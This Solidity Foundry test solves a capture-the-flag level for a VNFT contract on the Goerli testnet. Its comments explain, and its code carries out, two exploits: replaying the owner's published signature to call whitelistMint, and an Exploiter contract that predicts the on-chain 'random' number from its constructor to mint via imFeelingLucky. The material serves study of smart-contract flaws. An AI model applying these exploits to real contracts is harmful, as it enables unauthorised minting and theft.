// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./utils/BaseTest.sol";
import "src/VNFT.sol";

contract VNFTTest is BaseTest {
    VNFT private level;

    constructor() {
        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(1, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        level = VNFT(payable(0xC357c220D9ffe0c23282fCc300627f14D9B6314C));
        // level = new Switch();
        vm.label(address(level), "VNFT");
    }

    function testCompleteLevel() public {
        address player = users[0];
        vm.startPrank(player);

        // assert that we do not own any VNFT
        assertEq(level.balanceOf(player), 0);

        // If we look at the first transaction after the creation of the contract we see that the owner has called
        // `whitelistMint`
        // Because `whitelistMint` do not perform any check on who's really whitelisted (only that the )

        // There are two options to solve this CTF
        // 1) Find a way to call `whitelistMint` and mint directly an NFT
        // 2) Find the correct timing to call `imFeelingLucky`
        // Let's explore both of them

        ////////////////////////////////////////////
        // Exploiting whitelistMint function
        ////////////////////////////////////////////

        // If we look at the code inside `whitelistMint` we see that the first require call `recoverSigner`
        // and check that the returned address that signed the hashed messagege with the specified signature
        // is indeed the owner of the contract
        // What would that mean? If this require pass would mean that the caller owns an hash message signed by the owner with
        // his/her private key. This can be proved by the recovering the address of the signer using his own signature
        // Where is the problem in this whole mechanism? That while all the checks are corrects, anyone with those specific hash and signature
        // can call this message and prove that the owner of the contract have whitelisted them even if it's not true
        // After proving that the hash+signature were correct the contract should have burned them adding to a mapping
        // preventing future user to be able to use them
        //
        // Further reading:
        // - ECDSA lib from OpenZeppelin: https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA-recover-bytes32-bytes-
        // - EIP-191: Signed Data Standard: https://eips.ethereum.org/EIPS/eip-191

        // Let's take a look at the owner's transaction that called `whitelistMint`
        // https://goerli.etherscan.io/tx/0x77b3f89a955bd272221d7acb84600b6f9a1cdab47bdc6d3bb13fd6bc0877b6bf
        // we see that he/she has used
        // hash: 0xd54b100c13f0d0e7860323e08f5eeb1eac1eeeae8bf637506280f00acd457f54
        // signature: 0xf80b662a501d9843c0459883582f6bb8015785da6e589643c2e53691e7fd060c24f14ad798bfb8882e5109e2756b8443963af0848951cffbd1a0ba54a2034a951c

        bytes32 originalHash = bytes32(0xd54b100c13f0d0e7860323e08f5eeb1eac1eeeae8bf637506280f00acd457f54);
        bytes
            memory originalSignature = hex"f80b662a501d9843c0459883582f6bb8015785da6e589643c2e53691e7fd060c24f14ad798bfb8882e5109e2756b8443963af0848951cffbd1a0ba54a2034a951c";

        level.whitelistMint(player, 1, originalHash, originalSignature);
        assertEq(level.balanceOf(player), 1);

        ////////////////////////////////////////////
        // Exploiting imFeelingLucky function
        ////////////////////////////////////////////

        // This is the solution to follow if `whitelistMint` was not exploitable.
        // One big concept that you must always remember is that there is no real "native" randomness in the blockchain, but only "pseudo randomness"
        // When you look at the code and you see a variable called `randomNumber` you can immediately start thinking about a way to find the correct
        // values to recreate what the smart contract is expecting to receive to "trick" it to pass all the tests
        // The second check we need to pass is `(msg.sender).code.length == 0`
        // There are two different point in time when a smart contract has is code with a zero length
        // 1) After it has been destoyed. This is not a viable option because it's really zero only the block after calling the selfdestruct OPCODE
        // 2) During the constructor. The runtime bytecode of the contract is available only after executing the constructor.

        // Further reading:
        // - SWC-120: Weak Sources of Randomness from Chain Attributes: https://swcregistry.io/docs/SWC-120
        // - SWC-136: Unencrypted Private Data On-Chain: https://swcregistry.io/docs/SWC-136
        // - Chainlink VRF (Verifiable Random Function: https://docs.chain.link/docs/chainlink-vrf/
        // - OpenZeppelin Address.isContract important notes: https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-isContract-address-

        // Create a new Exploiter contract and run the exploit inside their `constructor`
        new Exploiter(level);

        // Assert we have
        assertEq(level.balanceOf(player), 2);

        vm.stopPrank();
    }
}

contract Exploiter {
    constructor(VNFT level) {
        // randomNumber requested by the smart contract to be able to mint an NFT via `imFeelingLucky`
        uint256 randomNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp, level.totalSupply()))
        ) % 100;

        // That's it, now we just need to call the contract with the same number it was expecting to see
        level.imFeelingLucky(msg.sender, 1, randomNumber);
    }
}
